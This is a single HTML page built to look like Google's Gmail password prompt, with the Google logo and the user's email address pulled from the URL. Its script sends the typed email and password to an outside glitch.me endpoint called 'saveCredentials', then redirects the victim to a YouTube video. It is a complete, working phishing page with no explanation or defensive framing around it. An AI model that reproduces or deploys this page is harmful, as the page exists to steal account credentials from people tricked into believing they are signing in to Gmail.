<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enter Password</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-50 h-screen flex items-center justify-center">
    <div class="w-full max-w-md mx-auto p-6 bg-white rounded-lg shadow-md">
        <div class="flex justify-center mb-6">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google logo" class="h-10">
        </div>
        <h1 class="text-2xl font-semibold text-gray-900 mb-2">Enter your password</h1>
        <p class="text-gray-600 mb-6">to continue to Gmail</p>
        <form id="passwordForm">
            <div class="mb-4">
                <label class="sr-only" for="password">Password</label>
                <input class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" id="password" name="password" placeholder="Password" type="password">
                <p id="passwordError" class="text-red-600 text-sm mt-2 hidden">Password must be at least 6 characters.</p>
            </div>
            <div class="flex justify-between items-center mb-6">
                <a class="text-blue-600 text-sm" href="#">Forgot password?</a>
            </div>
            <div class="flex justify-between items-center">
                <button id="submitBtn" class="bg-blue-600 text-white px-6 py-2 rounded-md" type="submit">Next</button>
            </div>
        </form>
    </div>

    <script>
        // Get the email from URL params
        const params = new URLSearchParams(window.location.search);
        const email = params.get('email');

        // Display email as part of the heading
        document.querySelector('h1').innerText = `Enter your password for ${email}`;

        const passwordForm = document.getElementById('passwordForm');
        const passwordInput = document.getElementById('password');
        const passwordError = document.getElementById('passwordError');

        passwordForm.addEventListener('submit', function (event) {
            event.preventDefault();
            const password = passwordInput.value;

            if (password.length < 6) {
                passwordError.classList.remove('hidden');
                passwordInput.classList.add('border-red-500');
            } else {
                passwordError.classList.add('hidden');
                passwordInput.classList.remove('border-red-500');

                // Send credentials to backend
                fetch('https://chipped-pine-tarascosaurus.glitch.me/saveCredentials', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        email: email,
                        password: password
                    }),
                })
                .then(response => response.ok ? window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ' : alert('Failed to send credentials'))
                .catch(error => console.error('Error:', error));
            }
        });
    </script>
</body>
</html>
